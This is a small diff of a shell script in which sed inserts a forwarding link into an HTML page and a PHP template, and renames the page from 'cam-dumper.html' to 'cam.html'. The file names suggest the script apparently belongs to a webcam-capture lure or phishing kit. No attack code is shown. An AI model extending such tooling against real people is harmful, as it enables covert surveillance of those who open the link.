@@ -155,7 +155,7 @@ fi
 link=${link#$q}
 link=${link%$q}
 
-sed 's+forwarding_link+'$link'+g' cam-dumper.html > index2.html
+sed 's+forwarding_link+'$link'+g' cam.html > index2.html
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 
 
